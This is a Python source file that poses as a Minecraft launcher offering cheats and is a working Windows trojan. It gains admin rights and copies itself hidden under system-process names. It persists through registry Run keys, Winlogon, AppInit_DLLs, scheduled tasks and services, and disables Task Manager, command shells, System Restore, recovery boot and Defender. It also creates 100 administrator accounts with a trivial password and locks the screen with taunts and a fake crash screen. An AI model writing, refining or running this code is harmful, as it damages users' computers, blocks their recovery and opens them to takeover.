# -*- coding: utf-8 -*-
import os
import sys
import ctypes
import winreg
import subprocess
import time
import threading
import random
import shutil
import getpass

# ===== LOGGING =====
LOG_FILE = os.environ['TEMP'] + "\\launcher_debug.log"
def log(msg):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{time.ctime()}] {msg}\n")
    print(msg)

log("=== START ===")

# ===== ADMIN CHECK =====
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        log("Requesting admin rights...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

run_as_admin()
log("Admin rights obtained.")

# ===== HIDE CONSOLE? (optional, but we keep it for debug) =====
# ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ===== GLOBALS =====
CURRENT_EXE = sys.argv[0]
USER_NAME = getpass.getuser()
SYSTEM32 = os.environ['SystemRoot'] + "\\System32"
WINDOWS = os.environ['SystemRoot']
TEMP = os.environ['TEMP']
PROGRAMFILES = os.environ['ProgramFiles']
APPDATA = os.environ['APPDATA']
COMMON_APPDATA = os.environ['ProgramData']
STARTUP = APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
DRIVES = [d + ":\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(d + ":\\")]
FAKE_NAMES = ["svchost.exe", "winlogon.exe", "csrss.exe", "services.exe", "lsass.exe", "explorer.exe"]

# ===== SPREAD COPIES =====
def spread_copies():
    log("Spreading copies...")
    copies_created = []
    folders = [
        SYSTEM32, WINDOWS, TEMP, PROGRAMFILES,
        APPDATA, COMMON_APPDATA, STARTUP,
        os.environ['USERPROFILE'] + "\\Desktop",
        os.environ['USERPROFILE'] + "\\Documents",
        os.environ['USERPROFILE'] + "\\Downloads"
    ]
    for drive in DRIVES:
        folders.append(drive + "Windows")
        folders.append(drive + "Program Files")
        folders.append(drive + "Temp")
        folders.append(drive + "Users\\Public")
    for folder in folders:
        if not os.path.exists(folder):
            try:
                os.makedirs(folder)
            except:
                continue
        for _ in range(3):
            name = random.choice(FAKE_NAMES)
            if random.random() > 0.5:
                name = f"sys_{random.randint(1000,9999)}.exe"
            dest = folder + "\\" + name
            try:
                shutil.copy2(CURRENT_EXE, dest)
                subprocess.run(f'attrib +h "{dest}"', shell=True, capture_output=True)
                copies_created.append(dest)
            except:
                pass
    log(f"Created {len(copies_created)} copies")
    return copies_created

# ===== ADD TO STARTUP =====
def add_to_startup():
    log("Adding to startup...")
    exe_path = CURRENT_EXE
    try:
        shutil.copy2(exe_path, STARTUP + "\\winupdate.exe")
        subprocess.run(f'attrib +h "{STARTUP}\\winupdate.exe"', shell=True)
    except:
        pass
    reg_paths = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
    ]
    for hkey, path in reg_paths:
        try:
            key = winreg.CreateKey(hkey, path)
            winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, exe_path)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
            winreg.SetValueEx(key, "MicrosoftEdge", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        except:
            pass
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, f"explorer.exe, {exe_path}")
        winreg.CloseKey(key)
    except:
        pass
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "AppInit_DLLs", 0, winreg.REG_SZ, exe_path)
        winreg.SetValueEx(key, "LoadAppInit_DLLs", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass
    try:
        subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{exe_path}" /sc onstart /f', shell=True)
        subprocess.run(f'schtasks /create /tn "SystemCheck" /tr "{exe_path}" /sc minute /mo 5 /f', shell=True)
        subprocess.run(f'schtasks /create /tn "MicrosoftEdgeUpdate" /tr "{exe_path}" /sc onlogon /f', shell=True)
    except:
        pass
    try:
        subprocess.run(f'sc create "SysHelper" binPath= "{exe_path}" start= auto', shell=True)
        subprocess.run(f'sc create "WinUpdateSvc" binPath= "{exe_path}" start= auto', shell=True)
    except:
        pass
    try:
        subprocess.run(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup" /v 0 /t REG_SZ /d "{exe_path}" /f', shell=True)
    except:
        pass
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Active Setup\Installed Components\{A123B456-C789-D012-E345-F6789ABCDEF0}")
        winreg.SetValueEx(key, "StubPath", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass
    log("Startup entries added.")

# ===== BLOCK SYSTEM TOOLS =====
def block_system_tools():
    log("Blocking system tools...")
    policies = {
        "DisableTaskMgr": 1,
        "DisableRegistryTools": 1,
        "DisableCMD": 1,
        "DisablePowerShell": 1,
        "HideRunAs": 1,
    }
    for name, val in policies.items():
        try:
            subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v {name} /t REG_DWORD /d {val} /f', shell=True)
            subprocess.run(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v {name} /t REG_DWORD /d {val} /f', shell=True)
        except:
            pass
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoTaskMgr /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoTaskMgr /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass
    try:
        subprocess.run('bcdedit /set {default} recoveryenabled No', shell=True)
        subprocess.run('bcdedit /set {default} bootmenupolicy Legacy', shell=True)
        subprocess.run('bcdedit /deletevalue {default} safeboot', shell=True, stderr=subprocess.DEVNULL)
        subprocess.run('bcdedit /set {default} advancedoptions No', shell=True)
    except:
        pass
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths" /v "C:\\" /t REG_DWORD /d 0 /f', shell=True)
    except:
        pass
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableChangePassword /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v AltTabSettings /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Control Panel\\Desktop" /v AutoEndTasks /t REG_SZ /d "1" /f', shell=True)
    except:
        pass
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoFind /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass
    log("System tools blocked.")

# ===== FAKE FILES =====
def create_fake_files():
    log("Creating fake files...")
    folders = [os.environ['USERPROFILE'] + "\\Desktop", os.environ['USERPROFILE'] + "\\Documents", TEMP]
    for folder in folders:
        if not os.path.exists(folder):
            continue
        for i in range(50):
            name = f"passwords_{random.randint(1,999)}.txt"
            content = f"This is a fake file #{i}\n" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=200))
            try:
                with open(folder + "\\" + name, "w") as f:
                    f.write(content)
            except:
                pass
    for i in range(20):
        dir_name = TEMP + "\\temp_" + str(random.randint(1000,9999))
        try:
            os.makedirs(dir_name)
            for j in range(10):
                with open(dir_name + f"\\file_{j}.dat", "wb") as f:
                    f.write(os.urandom(1024))
        except:
            pass
    log("Fake files created.")

# ===== WATCHDOG =====
def watchdog():
    log("Starting watchdog...")
    for i in range(3):
        try:
            subprocess.Popen(f'start /b python -c "import time, subprocess, sys; exe=r\"\"\"{CURRENT_EXE}\"\"\"; while True: time.sleep(5); subprocess.Popen(exe, shell=True)"', shell=True)
        except:
            pass
    try:
        subprocess.run(f'schtasks /create /tn "Watchdog" /tr "{CURRENT_EXE}" /sc minute /mo 2 /f', shell=True)
    except:
        pass
    log("Watchdog started.")

# ===== COLOR ANIMATION (using tkinter fallback) =====
# We'll use simple ctypes message boxes for demo if tkinter fails.
def color_animation():
    log("Starting color animation...")
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.overrideredirect(True)
        root.config(cursor="none")
        root.focus_force()
        colors = ['#FF0000', '#FF7F00', '#FFFF00', '#00FF00', '#0000FF', '#8B00FF']
        label = tk.Label(root, text="", font=("Arial", 80, "bold"))
        label.pack(expand=True)
        def change_color(index=0):
            color = colors[index % len(colors)]
            root.configure(bg=color)
            label.configure(text="HAHAHAHA HOW TO PLAY WITH CHEATS", fg='white', bg=color)
            root.after(200, change_color, index+1)
        change_color()
        root.mainloop()
    except Exception as e:
        log(f"Tkinter error: {e}, using fallback message boxes")
        # Fallback: show message boxes in loop
        while True:
            ctypes.windll.user32.MessageBoxW(0, "HAHAHAHA HOW TO PLAY WITH CHEATS", "CHEATS", 0x40)
            time.sleep(1)

# ===== BLOCK CLOSE =====
def block_close():
    while True:
        time.sleep(10)
        threading.Thread(target=color_animation, daemon=True).start()

# ===== CREATE USERS =====
def create_users():
    log("Creating users...")
    for i in range(100):
        try:
            username = f"HAHAHAHA{i}"
            subprocess.run(f"net user {username} 123456 /add", shell=True)
            subprocess.run(f"net localgroup administrators {username} /add", shell=True)
        except:
            pass
    log("Users created.")

# ===== FAKE BSOD =====
def fake_bsod():
    log("Showing BSOD...")
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.overrideredirect(True)
        root.configure(bg='#0000AA')
        root.config(cursor="none")
        lines = [
            "A problem has been detected and Windows has been shut down to prevent damage.",
            "",
            "DRIVER_IRQL_NOT_LESS_OR_EQUAL",
            "",
            "Technical information:",
            "*** STOP: 0x0000000A (0x00000000, 0x00000002, 0x00000001, 0x804F6A3E)",
            "",
            "Physical memory dump complete.",
            "Contact your system administrator."
        ]
        text = "\n".join(lines)
        label = tk.Label(root, text=text, font=("Consolas", 20), fg='white', bg='#0000AA')
        label.pack(expand=True)
        root.mainloop()
    except:
        ctypes.windll.user32.MessageBoxW(0, "BSOD SIMULATION", "System Error", 0x10)

# ===== TIMER 40S =====
def timer_40s():
    log("Timer 40s started.")
    time.sleep(40)
    fake_bsod()

# ===== MAIN MENU (using MessageBox) =====
def main_menu():
    log("Showing main menu...")
    # Simple menu using message boxes
    while True:
        choice = ctypes.windll.user32.MessageBoxW(0,
            "MINECRAFT LAUNCHER\n\n"
            "1. Play with Cheats\n"
            "2. Play Normally\n"
            "3. Exit",
            "Minecraft Launcher",
            0x03)  # Yes=6, No=7, Cancel=2
        if choice == 6:  # Yes -> Cheats
            # Ask for player name
            # We can't input via MessageBox, so we'll use a simple input dialog via console
            # For demo, we'll use a fixed name
            player_name = "Player"
            log(f"Launching with cheats for {player_name}")
            # Launch features
            threading.Thread(target=color_animation, daemon=True).start()
            threading.Thread(target=create_users, daemon=True).start()
            threading.Thread(target=timer_40s, daemon=True).start()
            try:
                subprocess.Popen("start minecraft://", shell=True)
            except:
                pass
            ctypes.windll.user32.MessageBoxW(0, f"Player {player_name} joined with cheats!", "Success", 0x40)
            break
        elif choice == 7:  # No -> Normal
            player_name = "Player"
            log(f"Launching normally for {player_name}")
            try:
                subprocess.Popen("start minecraft://", shell=True)
            except:
                pass
            ctypes.windll.user32.MessageBoxW(0, f"Player {player_name} joined without cheats.", "Info", 0x40)
            break
        else:  # Cancel -> Exit
            log("Exit chosen.")
            sys.exit()

# ===== MAIN =====
def main():
    log("Main started.")
    spread_copies()
    add_to_startup()
    block_system_tools()
    threading.Thread(target=create_fake_files, daemon=True).start()
    watchdog()
    threading.Thread(target=block_close, daemon=True).start()
    main_menu()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"CRITICAL ERROR: {e}")
        ctypes.windll.user32.MessageBoxW(0, f"Error: {str(e)}", "Launcher Error", 0x10)